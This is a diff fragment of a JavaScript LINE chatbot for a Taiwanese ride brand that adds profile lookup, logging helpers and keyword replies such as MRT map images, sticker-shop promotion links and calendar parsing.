-      return Promise.resolve(confirm);
-    }else{
-      return Promise.resolve(0);
+
+                this.log('Send message succeeded');
+                resolve(body);
+            });
+        });
     }
-  }
 
-  // rule(phone){
-  //   var i,jd,phonetemp;
+    getProfile(userid) {
+        console.log("fuckin user =" + userid);
+        return new Promise((resolve, reject) => {
+            request.get(`https://api.line.me/v2/bot/profile/${userid}`, {
+                headers: {
+                    'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
+                }
+            }, (error, response, body) => {
+                if (error) {
+                    this.logError('Error while sending message', error);
+                    reject(error);
+                    return;
+                }
 
-  //   phonetemp = "0123456789-+ ";
-  //   if(phone.length == 10){
-  //     if( (phone.charAt(0) + phone.charAt(1)) === "09" ){
-  //       for (i = 0;i<phone.length;i++){
-  //         jd = phonetemp.indexOf(phone.charAt(i));
-  //         if(jd == -1)
-  //           return 0;
-  //       }
-  //       return 1 ;
-  //     }else{
-  //       return 0 ;
-  //     }
-  //   }else{
-  //     return 0 ;
-  //   }
-  // }
+                if (response.statusCode !== 200) {
+                    this.logError('Error status code while sending message', body);
+                    reject(error);
+                    return;
+                }
+
+                this.log('Send message succeeded');
+                resolve(body);
+            });
+        });
+    }
+
+    filterPlatformMessages(messages, platform) {
+        if (messages) {
+            let platformMessages = messages.filter(m => m.platform === platform);
+            if (platformMessages.length === 0) {
+                platformMessages = messages.filter(m => !this.isDefined(m.platform));
+            }
+            return platformMessages;
+        } else {
+            return [];
+        }
+    }
+
+    sleep(delay) {
+        return new Promise((resolve, reject) => {
+            setTimeout(() => resolve(), delay);
+        });
+    }
+
+    log() {
+        let args = Array.prototype.slice.call(arguments);
+        console.log.apply(console, args);
+    }
+
+    logError() {
+        let args = Array.prototype.slice.call(arguments);
+        console.error.apply(console, args);
+    }
+
+    isDefined(obj) {
+        if (typeof obj === 'undefined') {
+            return false;
+        }
+
+        if (!obj) {
+            return false;
+        }
+
+        return obj !== null;
+    }
+
+    wrongphone(message) {
+        mongo.updateStatus(message.source.userId, 1, (err, res) => {
+            if (err) console.log(err);
+            else console.log(res);
+        });
+
+        return bnreply.askphonereply();
+    }
+
+
+    PUBG(message, status) {
+        //return Promise.resolve(0)
+        if (message.message.text === "Cubee 安安") {
+            const confirm = bnreply.cubee(); // end confirm
+            return Promise.resolve(confirm);
+        } else if ((message.message.text.indexOf('TaxiGo') != -1)) {
+            const confirm = {
+                type: "text",
+                text: "TaxiGo 我兄弟啦 "
+            };
+            const pushConfirm = {
+                type: "text",
+                text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/3998963"
+            };
+            this.replyPush(message.source.groupId || message.source.userId, [pushConfirm]);
+            const pushConfirm1 = {
+                type: "text",
+                text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/4357617"
+            };
+            this.replyPush(message.source.groupId || message.source.userId, [pushConfirm1]);
+            const pushConfirm2 = {
+                type: "text",
+                text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/3998963"
+            };
+            this.replyPush(message.source.groupId || message.source.userId, [pushConfirm2]);
+            const pushConfirm3 = {
+                type: "text",
+                text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/4212262"
+            };
+            this.replyPush(message.source.groupId | message.source.userId, [pushConfirm3]);
+            const pushConfirm4 = {
+                type: "text",
+                text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/4212262"
+            };
+            this.replyPush(message.source.groupId || message.source.userId, [pushConfirm4]);
+            const pushConfirm5 = {
+                type: "text",
+                text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/3662781"
+            };
+            this.replyPush(message.source.groupId || message.source.userId, [pushConfirm5]);
+            const pushConfirm6 = {
+                type: "text",
+                text: "找我兄弟不如買我們的貼圖 https://line.me/S/sticker/4212408"
+            };
+            this.replyPush(message.source.groupId || message.source.userId, [pushConfirm6]);
+            return Promise.resolve(confirm);
+        }
+        if (message.message.text === "BlueNet功能 敬請期待" || message.message.text === "BN 測試 #####") {
+
+            return Promise.resolve(eroFunction.chooseMenu());
+        } else if (message.message.text === "查詢") {
+            const confirm = {
+                type: "text",
+                text: "your line userid = " + message.source.userId
+            }; // end confirm
+            return Promise.resolve(confirm);
+        } else if (((message.message.text.indexOf('台北') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('北捷') != -1)) {
+            const confirm = {
+                "type": "image",
+                "originalContentUrl": "https://i.imgur.com/oJBhOG4.jpg",
+                "previewImageUrl": "https://i.imgur.com/oJBhOG4.jpg"
+            }; // end confirm
+            return Promise.resolve(confirm);
+        } else if (((message.message.text.indexOf('高雄') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('高捷') != -1)) {
+            const confirm = {
+                "type": "image",
+                "originalContentUrl": "https://i.imgur.com/jAyj5vY.jpg",
+                "previewImageUrl": "https://i.imgur.com/jAyj5vY.jpg"
+            }; // end confirm
+            return Promise.resolve(confirm);
+        } else if ((message.message.text.indexOf('捷運') != -1)) {
+            const confirm = {
+                "type": "template",
+                "altText": "Ask MRT template",
+                "template": {
+                    "type": "buttons",
+                    "thumbnailImageUrl": "https://www.bluenet-ride.com/images/drawable/cubeegroup/surprisecubee.png",
+                    "imageAspectRatio": "rectangle",
+                    "imageSize": "cover",
+                    "imageBackgroundColor": "#4898AF",
+                    "title": "搭捷運嗎 ?",
+                    "text": "您要台北捷運還是高雄捷運呢 ?",
+                    "defaultAction": {
+                        "type": "uri",
+                        "label": "View detail",
+                        "uri": "http://example.com/page/123"
+                    },
+                    "actions": [{
+                            "type": "message",
+                            "label": "北捷",
+                            "text": "北捷"
+                        },
+                        {
+                            "type": "message",
+                            "label": "高捷",
+                            "text": "高捷"
+                        }
+                    ]
+                }
+            }; // end confirm
+            return Promise.resolve(confirm);
+        } else if (message.message.text === "老鐵回家了") {
+            return Promise.resolve(eroFunction.selftest());
+        } else if ((message.message.text.indexOf('開始時間') != -1) && (message.message.text.indexOf('結束時間') != -1) && (message.message.text.indexOf('地點') != -1)) {
+            var index = {
+                start: message.message.text.indexOf('開始時間'),
+                end: message.message.text.indexOf('結束時間'),
+                location: message.message.text.indexOf('活動地點'),
+                content: message.message.text.indexOf('活動內容')
+            }
+            var start = message.message.text.slice(index.start + 5, index.end);
+            var end = message.message.text.slice(index.end + 5, index.location);
+            var title = message.message.text.slice(0, index.start);
+            var location = message.message.text.slice(index.location + 5, index.content);
+            const confirm = bnreply.calendarReply(title, start, end, location);
+            // const confirm = {
+            //     "type": "template",
+            //     "altText": "cubee詢問是否加進日曆",
+            //     "template": {
+            //         "type": "confirm",
+            //         "text": "要加進日曆嗎?",
+            //         "actions": [{
+            //                 "type": "uri",
+            //                 "label": "Yes",
+            //                 "uri": `http://bn-calendar.herokuapp.com?title=${title}&start=${start}&end=${end}&location=${location}`
+            //             },
+            //             {
+            //                 "type": "postback",
+            //                 "label": "No",
+            //                 "data": "action=no"
+            //             }
+            //         ]
+            //     }
+            // }
+            return Promise.resolve(confirm);
+        } else {
+            return Promise.resolve(0);
+        }
+    }
+
+    // rule(phone){
+    //   var i,jd,phonetemp;
+
+    //   phonetemp = "0123456789-+ ";
+    //   if(phone.length == 10){
+    //     if( (phone.charAt(0) + phone.charAt(1)) === "09" ){
+    //       for (i = 0;i<phone.length;i++){
+    //         jd = phonetemp.indexOf(phone.charAt(i));
+    //         if(jd == -1)
+    //           return 0;
+    //       }
+    //       return 1 ;
+    //     }else{
+    //       return 0 ;
+    //     }
+    //   }else{
+    //     return 0 ;
+    //   }
+    // }
 };
